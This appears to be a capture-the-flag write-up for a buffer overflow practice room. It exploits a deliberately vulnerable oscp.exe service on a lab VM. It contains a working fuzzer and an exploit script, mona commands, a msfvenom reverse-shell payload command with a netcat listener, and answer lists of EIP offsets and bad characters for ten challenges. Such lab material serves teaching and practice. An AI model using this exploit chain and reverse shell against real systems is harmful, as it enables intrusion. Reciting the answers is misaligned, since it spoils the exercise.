# Buffer Overflow Prep - Easy

1. [OVERFLOW1](#overflow1)
2. [OVERFLOW2](#overflow2)
3. [OVERFLOW3](#overflow3)
4. [OVERFLOW4](#overflow4)
5. [OVERFLOW5](#overflow5)
6. [OVERFLOW6](#overflow6)
7. [OVERFLOW7](#overflow7)
8. [OVERFLOW8](#overflow8)
9. [OVERFLOW9](#overflow9)
10. [OVERFLOW10](#overflow10)

## OVERFLOW1

```shell
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.36.72 /workarea
#connect to machine rdp

#after running oscp.exe
nc 10.10.36.72 1337
#connected to OSCP vulnerable server

HELP

OVERFLOW1 test

vim fuzzer.py

python3 fuzzer.py
#fuzzer crashed at 2000 bytes

vim exploit.py

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
#generates cyclic pattern of 2000+400 bytes

vim exploit.py
#copy pattern to payload variable

#re-open oscp.exe in Immunity Debugger, and run it again
#necessary before running exploit.py everytime

python3 exploit.py
#crashes oscp.exe server

vim exploit.py
#update offset variable to EIP offset
#set payload variable to empty string
#set retn variable to "BBBB"

#restart oscp.exe before running exploit
python3 exploit.py

vim badchars.py

python3 badchars.py
#copy output to payload variable in exploit.py

#continue cycle till badchars are found and mona compare returns 'unmodified'

vim exploit.py
#add jump point address to 'retn' in little-endian format

#generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.31.212 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c

vim exploit.py
#add payload, enclosed in brackets
#also edit to var padding = "\x90" * 16

#setup listener
nc -nvlp 4444

#run exploit
python3 exploit.py
#we get reverse shell
```

* Given, we have a 32-bit Windows 7 VM with Windows Firewall & Defender disabled.

* We will be using Immunity Debugger to help with buffer overflows.

* Run the Immunity Debugger application as Administrator, and use 'Open File' to open the vulnerable app (oscp.exe).

* Run the binary; oscp.exe is now running and listening on port 1337.

* Connecting to the Windows machine on port 1337 with Kali, we get access to the OSCP Vulnerable Server; we have to go for OVERFLOW1 here.

* Run the following command in the command input box in Immunity Debugger (bottom section):

  ```!mona config -set workingfolder c:\mona\%p```

* Now, we need to create ```fuzzer.py``` in Kali:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.36.72"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

* The fuzzer script keeps sending these long strings, until it crashes at 2000 bytes.

* We can create ```exploit.py``` now:

```python
import socket

ip = "10.10.36.72"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
#update offset
overflow = "A" * offset
retn = ""
#set to "BBBB"
padding = ""
payload = ""
#insert generated payload in var
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

* Now, we can run the command to generate a string of length 400 bytes more than the string that crashed the server.

* The output should be copied and placed in the payload variable of ```exploit.py```.

* Before running ```exploit.py```, we have to always re-open oscp.exe in Immunity Debugger and run the binary again; then run the exploit script (which crashes the server).

* Run another command in the command input box in Immunity Debugger to change distance to pattern length:

  ```!mona findmsp -distance 2400```

* This generates a log window with command output; it includes the EIP offset in the form of the pattern ```EIP contains normal pattern``` - we need to note the offset at end.

* Now, we need to set offset variable to EIP offset value, set payload variable to empty string, and retn variable to "BBBB".

* After restarting oscp.exe in Immunity Debugger, and then running the ```exploit.py``` script again, we can see that the EIP register (can be viewed in registers section) is overwritten with 42424242 (four B's).

* Now, we need to generate bytearray using mona, and exclude the null byte (\x00) by default - this generates a location of the bytearray file:

  ```!mona bytearray -b "\x00"```

* We can generate a string of badchars identical to bytearray using Python script:

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

* We can run the Python script and copy the string output to the payload variable of ```exploit.py```.

* After restarting & running oscp.exe, and then running the exploit script, we need to note the address to which ESP register points, and use it in mona command:

  ```!mona compare -f C:\mona\oscp\bytearray.bin -a 01A1FA30```

* This gives us a popup window for 'mona Memory comparison results' and shows the badchars (including \x00) - 00 07 00 2e 2f a0 a1

* Using these badchars, we need to generate a new bytearray in mona, this time specifying these badchars along with \x00, then we need to update payload variable in exploit again, and remove new badchars.

* Then, restart oscp.exe and run modified exploit again - this process has to be repeated until results status shows 'unmodified' - which indicates no more badchars exist.

* It is given that often badchars cause the next byte to get corrupted as well, so looking at generated badchars, the badchars would be (besides \x00) - \x07 \x2e \xa0

* Therefore, generating new bytearray:

  ```!mona bytearray -b "\x00\x07\x2e\xa0"```

* We need to update the badchars script, so that the output can be replaced into the payload variable in exploit script:

```python
from __future__ import print_function

listRem = "\\x07\\x2e\\xa0".split("\\x")
for x in range(1, 256):
    if "{:02x}".format(x) not in listRem:
        print("\\x" + "{:02x}".format(x), end='')
print()
```

* Now, on doing the same cycle over again, and running the following mona compare command, we get 'unmodified' message - which means the badchars are removed:

  ```!mona compare -f C:\mona\oscp\bytearray.bin -a 01ABFA30```

* Now, we need to find jump point, using the badchars:

  ```!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"```

* We need to choose the address (for jump point) from 'Log Data' window - and it should have many 'False' conditions - in this case, we can choose "625011AF"

* As we have to follow the 'little endian' system, the address would be written in reverse - "\xaf\x11\x50\x62" - this would be added to the retn variable in our exploit script.

* After generating payload using msfvenom, we can copy it to our exploit script, enclosed in brackets.

* After editing the padding variable, we can setup netcat listener on port 4444, and restart oscp.exe in Immunity Debugger.

* Running the exploit now will give us a reverse shell.

```markdown
1. What is the EIP offset for OVERFLOW1? - 1978

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW1? - \x00\x07\x2e\xa0
```

## OVERFLOW2

```shell
vim fuzzer.py

python3 fuzzer.py

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100

vim exploit.py

#restart oscp.exe in Immunity Debugger and run
python3 exploit.py

#generate badchars and run exploit again
```

* We have to follow the same steps as OVERFLOW1:

  ```!mona config -set workingfolder c:\mona\%p```

* For OVERFLOW2, fuzzing crashes at 700 bytes; after running exploit:

  ```!mona findmsp -distance 1100```

* This gives EIP offset 634; we accordingly update exploit.py variables offset and retn.

* After running the exploit, and confirming the EIP register is overwritten, we can begin finding badchars.

* Generating bytearray using mona:

  ```!mona bytearray -b "\x00"```

* Using the bytearray Python script, we can execute and copy output to the payload variable of exploit script.

* After running the exploit again, we can note the ESP address and use it in the mona command:

  ```!mona compare -f C:\mona\oscp\bytearray.bin -a 0192FA30```

* The memory comparison gives us the badchars - 00 23 24 3c 3d 83 84 ba bb

* Considering that badchars can modify the immediate next byte, the badchars are - 00 23 3c 83 ba

```markdown
1. What is the EIP offset for OVERFLOW2? - 634

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW2? - \x00\x23\x3c\x83\xba
```

## OVERFLOW3

```markdown
1. What is the EIP offset for OVERFLOW3? - 1274

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW3? - \x00\x11\x40\x5f\xb8\xee
```

## OVERFLOW4

```markdown
1. What is the EIP offset for OVERFLOW4? - 2026

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW4? - \x00\xa9\xcd\xd4
```

## OVERFLOW5

```markdown
1. What is the EIP offset for OVERFLOW5? - 314

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW5? - \x00\x16\x2f\xf4\xfd
```

## OVERFLOW6

```markdown
1. What is the EIP offset for OVERFLOW6? - 1034

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW6? - \x00\x08\x2c\xad
```

## OVERFLOW7

```markdown
1. What is the EIP offset for OVERFLOW7? - 1306

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW7? - \x00\x8c\xae\xbe\xfb
```

## OVERFLOW8

```markdown
1. What is the EIP offset for OVERFLOW8? - 1786

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW8? - \x00\x1d\x2e\xc7\xee
```

## OVERFLOW9

```markdown
1. What is the EIP offset for OVERFLOW9? - 1514

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW9? - \x00\x04\x3e\x3f\xe1
```

## OVERFLOW10

```markdown
1. What is the EIP offset for OVERFLOW10? - 537

2. In byte order and including the null byte \x00, what were the badchars for OVERFLOW10? - \x00\xa0\xad\xbe\xde\xef
```
